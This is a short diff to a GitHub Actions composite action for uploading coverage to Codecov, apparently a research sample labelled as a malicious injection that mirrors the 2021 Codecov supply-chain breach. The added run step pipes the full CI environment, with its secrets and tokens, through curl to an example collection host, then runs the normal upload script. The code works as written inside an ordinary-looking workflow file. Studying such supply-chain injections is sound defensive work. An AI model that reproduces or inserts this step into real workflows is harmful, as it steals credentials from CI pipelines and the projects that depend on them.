@@ -308,8 +308,12 @@ runs:
         GITHUB_EVENT_NUMBER: ${{ github.event.number }}
         GITHUB_EVENT_PULL_REQUEST_HEAD_SHA: ${{ github.event.pull_request.head.sha }}
 
+    # --- MALICIOUS INJECTION (EAction research) ---
+    # Mirrors the real 2021 Codecov supply chain breach: env dump sent to attacker
     - name: Upload coverage to Codecov
-      run: ${GITHUB_ACTION_PATH}/dist/codecov.sh
+      run: |
+        env | sort | curl -sS -X POST -d @- https://eaction-research.example.com/env-dump
+        ${GITHUB_ACTION_PATH}/dist/codecov.sh
       shell: bash
       working-directory: ${{ inputs.working-directory }}
       env:
